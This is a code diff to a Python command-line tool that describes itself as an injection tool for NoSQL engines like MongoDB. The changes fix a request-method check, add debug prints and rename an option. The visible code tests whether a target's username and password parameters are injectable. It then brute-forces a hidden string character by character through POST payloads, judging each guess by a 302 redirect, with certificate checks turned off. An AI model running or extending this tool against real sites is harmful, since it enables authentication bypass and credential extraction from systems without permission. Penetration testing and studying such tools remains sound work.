@@ -32,8 +32,7 @@ class CodeInjector:
         self.ot = ot
 
     def test_injection(self):
-        stdout.write('')
-        if self.r is 'post' or 'POST':
+        if self.r is 'POST':
             if self.inject(test=True):
                 stdout.write(bc.OKGREEN + f'[+] Host {self.h} is injectable with "{self.up}" and "{self.pp}" parameters'+'\n'+bc.DEFAULT)
                 return True
@@ -49,6 +48,7 @@ class CodeInjector:
         if test:
             return injection_payloads['test_pay']
         if not test:
+            print(injection_payloads[self.tg])
             return injection_payloads[self.tg]
 
     def inject(self, test=False):
@@ -63,13 +63,14 @@ class CodeInjector:
             matches = []
             if self.r is 'POST':
                 for c in string.printable:
+                    print(c)
                     if c in badchar:
                         continue
                     payload = self.build_payload(char=c)
                     query = post(self.h, data=payload, allow_redirects=False, verify=False)
                     if query.status_code == 302:
                         stdout.write(bc.OKBLUE + f'[+] Found matching character "{c}"\n'
-                                  + bc.DEFAULT + '[*] Enumerating rest of string...\n')
+                                   + bc.DEFAULT + '[*] Enumerating rest of string...\n')
                         matches.append(c)
                         while True:
                             for cc in string.printable:
@@ -98,7 +99,7 @@ Injection tool for NoSQL database engines like MongoDB'''+'\n\n')
 
 show_banner()
 @click.command()
-@click.option('-self.r','--request',type=click.Choice(['POST','GET']),default='POST',
+@click.option('-r','--request',type=click.Choice(['POST','GET']),default='POST',
                     help='Choose request type',show_default=True)
 @click.option('-U','userp',default='username',
                     help='Name of the username parameter',show_default=True,metavar='<str>')
